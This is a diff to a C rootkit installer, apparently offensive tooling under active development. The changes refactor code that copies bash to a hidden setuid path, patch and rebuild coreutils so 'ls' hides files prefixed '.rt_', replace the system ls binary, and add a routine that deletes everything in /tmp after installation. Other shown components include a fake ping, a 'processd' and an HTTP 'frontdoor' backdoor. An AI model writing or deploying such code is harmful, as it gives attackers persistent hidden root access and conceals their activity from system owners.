@@ -5,6 +5,14 @@
 #include <sys/stat.h> // For file perms
 #include <fcntl.h>
 #include <curl/curl.h>
+#include <dirent.h> 
+
+#ifdef FILENAME_MAX
+    #define FILENAME_LEN FILENAME_MAX
+#else
+    #define FILENAME_LEN 255
+#endif
+#define MAX_BUFFER_SIZE 10240
 
 #define BASH_ID     1
 #define PROCESSD_ID 2
@@ -19,6 +27,7 @@
 
 // Debugging mode
 // #define QUIET
+#define WORKING_DIR "/tmp"
 
 // Useful Macros (modify these if path changes made elsewhere)
 #define SETUID_BASH_PATH "/lib/gcc/rt_bash"
@@ -40,7 +49,7 @@ int re_http_frontdoor(void);
 
 int re_setuid_bash(void){
     struct stat file_stat;
-    char copy_buffer[10240];
+    char copy_buffer[MAX_BUFFER_SIZE];
     int bash, setuid_bash;
     int bytes_read;
     
@@ -65,7 +74,7 @@ int re_setuid_bash(void){
     }
 
 
-    while ((bytes_read = fread(buffer, 1, sizeof(copy_buffer), bash)) > 0) {
+    while ((bytes_read = fread(copy_buffer, 1, sizeof(copy_buffer), bash)) > 0) {
         write(setuid_bash, copy_buffer, bytes_read);
     } if (ferror(file)) {
         fprintf(stderr, "\nAn error occurred while reading the file.\n");
@@ -192,25 +201,25 @@ static const char *ls_commands = { "sed -i -e 's/# deb-src/deb-src/' /etc/apt/so
     "cd coreutils-*", 
     "yes | autoreconf -fiv", 
     "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules", 
-    "awk 'BEGIN { ", 
-    "  found = 0; inserted = 0", 
-    "} ", 
-    "/file_ignored \\(char const \\*name\\)$/ { ", 
-    "  print $0", 
-    "  found = 1", 
-    "  next", 
-    "} ", 
-    "found == 1 && inserted == 0 && $0 == \"{\" { ", 
-    "  print $0", 
-    "  print \"  if (strncmp(name, \\".rt_\\", 3) == 0) { return true; }\"", 
-    "  inserted = 1", 
-    "  found = 2", 
-    "  next", 
-    "} ", 
-    "{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c", 
-    "make -j${nproc}", 
+        "awk 'BEGIN { \n" 
+        "  found = 0; inserted = 0\n" 
+        "} \n" 
+        "/file_ignored \\(char const \\*name\\)$/ { \n"
+        "  print $0\n"
+        "  found = 1\n" 
+        "  next\n"
+        "} \n" 
+        "found == 1 && inserted == 0 && $0 == \"{\" { \n" 
+        "  print $0\n"
+        "  print \"  if (strncmp(name, \\\".rt_\\\", 3) == 0) { return true; }\"\n" 
+        "  inserted = 1\n"
+        "  found = 2\n"
+        "  next\n"
+        "} \n"
+        "{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c", 
+    "make -j`nproc`", 
     "echo \"Replacing ls\"", 
-    "cp src/ls $(which ls)", 
+    "cp src/ls `which ls`", 
     "cd ..",
     NULL
 };
@@ -260,8 +269,17 @@ int re_http_frontdoor(void){
 
 #define FAILURE_STRING "Failed to install %s\n"
 #define print_failure(message) fprintf(stderr, FAILURE_STRING, message);
+
 int main(int argc, char **argv){
+    struct dirent *de;
+    DIR *dr;
     int failures = 0;
+    char current_file[FILENAME_MAX];
+
+    // Change working directory 
+    chdir(WORKING_DIR);
+
+    // Run install subprograms
     if(INSTALL & BASH_ID && re_setuid_bash())
         failures |= BASH_ID;
     if(INSTALL & PROCESSD_ID && re_processd())
@@ -271,6 +289,22 @@ int main(int argc, char **argv){
     if(INSTALL & PING_ID && re_fake_ping())
         failures |= PING_ID;
 
+    // Empty /tmp
+    dr = opendir(WORKING_DIR);
+    if (dr == NULL) { 
+        perror("opendir"); 
+        return 1;
+    }
+    while ((de = readdir(dr)) != NULL) {
+        #ifndef QUIET
+        fprintf(stderr, "Removing " WORKING_DIR "/%s\n", de->d_name);
+        #endif
+        sprintf(current_file, "" WORKING_DIR "/%s", de->d_name);
+        remove(current_file);
+    }
+    closedir(dr);
+
+    // Print failures at program end
     if (failures & BASH_ID)
         print_failure("setuid bash");
     if (failures & PROCESSD_ID)
